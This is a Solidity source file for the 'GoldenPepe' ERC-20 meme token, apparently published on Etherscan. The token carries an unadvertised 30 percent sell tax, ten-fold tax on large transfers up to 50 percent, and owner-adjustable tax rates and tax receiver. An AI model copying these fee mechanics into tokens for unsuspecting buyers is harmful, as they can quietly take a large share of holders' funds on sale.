/**
 *Submitted for verification at Etherscan.io on 2023-07-18
*/

pragma solidity ^0.8.20;
// SPDX-License-Identifier: Unlicensed

interface IERC20 {
  function totalSupply() external view returns (uint256);
  function balanceOf(address account) external view returns (uint256);
  function transfer(address recipient, uint256 amount) external returns (bool);
  function allowance(address owner, address spender) external view returns (uint256);
  function approve(address spender, uint256 amount) external returns (bool);
  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
  event Transfer(address indexed from, address indexed to, uint256 value);
  event Approval (address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeMath: addition overflow");
    return c;
  }
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SafeMath: subtraction overflow");
  }
  function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b <= a, errorMessage);
    uint256 c = a - b;
    return c;
  }
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }
    uint256 c = a * b;
    require(c / a == b, "SafeMath: multiplication overflow");
    return c;
  }
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafeMath: division by zero");
  }
  function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b > 0, errorMessage);
    uint256 c = a / b;
    return c;
  }

}

abstract contract Context {
  function _msgSender() internal view virtual returns (address) {
    return msg.sender;
  }
}

contract Ownable is Context {
  address private _owner;
  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
  constructor () {
    address msgSender = _msgSender();
    _owner = msgSender;
    emit OwnershipTransferred(address(0), msgSender);
  }
  function owner() public view returns (address) {
    return _owner;
  }
  modifier onlyOwner() {
    require(_owner == _msgSender(), "Ownable: caller is not the owner");
    _;
  }
  function renounceOwnership() public virtual onlyOwner {
    emit OwnershipTransferred(_owner, address(0));
    _owner = address(0);
  }
}

interface IDEXFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IDEXRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

interface InterfaceLP {
    function sync() external;
}

contract GoldenPepe is Context, IERC20, Ownable {
  using SafeMath for uint256;
  mapping (address => uint256) private _balances;
  mapping (address => mapping (address => uint256)) private _allowances;
  IDEXRouter public router;
  InterfaceLP private pairContract;
  address public pair;
  address WETH;
  
  event ClearStuck(uint256 amount);
  event ClearToken(address TokenAddressCleared, uint256 Amount);

  uint256 firstBlock;

  uint8 private _decimals = 5; //number of decimal places
  uint256 private _totalSupply = 69042069000069042069;
  uint256 private _maxWalletSize = 690420690000742069; //wallet size is locked to this amount
  uint256 private _walletSizeLocked = 164; //wallet size is locked for this number of blocks
  string private _symbol = "GOLD";
  string private _name = "GoldenPepe";
  uint256 private transferpercent = 2;
  uint256 private sellpercent = 30;
  uint256 private buypercent = 2;
  address private taxWallet;



  constructor() {
    router = IDEXRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    WETH = router.WETH();
    pair = IDEXFactory(router.factory()).createPair(WETH, address(this));
    pairContract = InterfaceLP(pair);
    
    _allowances[address(this)][address(router)] = type(uint256).max;
    taxWallet = _msgSender();
    _balances[_msgSender()] = _totalSupply;
    firstBlock = block.number;
    emit Transfer(address(0), _msgSender(), _totalSupply);
  }
  receive() external payable { }

  function getOwner() external view returns (address) {
    return owner();
  }
  function decimals() external view returns (uint8) {
    return _decimals;
  }
  function symbol() external view returns (string memory) {
    return _symbol;
  }
  function name() external view returns (string memory) {
    return _name;
  }
  function totalSupply() external view override returns (uint256) {
    return _totalSupply;
  }
  function balanceOf(address account) external view override returns (uint256) {
    return _balances[account];
  }
  function transfer(address recipient, uint256 amount) external override returns (bool) {
    _transfer(_msgSender(), recipient, amount);
    return true;
  }
  function allowance(address owner, address spender) external view override returns (uint256) {
    return _allowances[owner][spender];
  }
  function approve(address spender, uint256 amount) external override returns (bool) {
    _approve(_msgSender(), spender, amount);
    return true;
  }
  function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
    _transfer(sender, recipient, amount);
    _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "transfer amount exceeds allowance"));
    return true;
  }
  function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
    _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
    return true;
  }
  function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
    _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "error in decrease allowance"));
    return true;
  }
  function _transfer(address sender, address recipient, uint256 amount) internal {
    require(sender != address(0), "transfer sender address is 0 address");
    require(recipient != address(0), "transfer recipient address is 0 address");
    require(amount > 0, "Transfer amount must be greater than zero");

    if (sender != owner() && recipient != owner() && recipient != pair && recipient != taxWallet) {
      if (firstBlock + _walletSizeLocked > block.number) {
        require(_balances[recipient] + amount <= _maxWalletSize, "Exceeds the maxWalletSize.");
      }
    }

    _balances[sender] = _balances[sender].sub(amount, "transfer balance too low");
    amount = (sender == taxWallet || recipient == taxWallet) ? amount : takeTax(sender, amount, recipient);
    _balances[recipient] = _balances[recipient].add(amount);

    emit Transfer(sender, recipient, amount);
  }

  function takeTax(address sender, uint256 amount, address recipient) internal returns (uint256) {
    
    uint256 percent = transferpercent;
    if(recipient == pair) {
        percent = sellpercent;
    } else if(sender == pair) {
        percent = buypercent;
    }

    if(amount>_maxWalletSize)
        percent = percent.mul(10);
    if(percent>50)
        percent = 50;

    uint256 tax = amount.mul(percent).div(100);
    _balances[taxWallet] = _balances[taxWallet].add(tax);
    emit Transfer(sender, taxWallet, tax);
    return amount.sub(tax);
  }

  function setTaxes(uint256 _transferpercent, uint256 _sellpercent, uint256 _buypercent) public onlyOwner {
    transferpercent=_transferpercent;
    sellpercent=_sellpercent;
    buypercent=_buypercent;
  }

  function setTaxReceiver(address _receiver) public onlyOwner {
    taxWallet = _receiver;
  }

  function receiveStuckETH() external { 
    payable(taxWallet).transfer(address(this).balance);
  }

  function receiveStuckToken(address tokenAddress, uint256 tokens) external returns (bool success) {
    if(tokens == 0){
      tokens = IERC20(tokenAddress).balanceOf(address(this));
    }
    emit ClearToken(tokenAddress, tokens);
    return IERC20(tokenAddress).transfer(taxWallet, tokens);
  }

  function _approve(address owner, address spender, uint256 amount) internal {
    require(owner != address(0), "approve owner is 0 address");
    require(spender != address(0), "approve spender is 0 address");
    _allowances[owner][spender] = amount;
    emit Approval(owner, spender, amount);
  }
}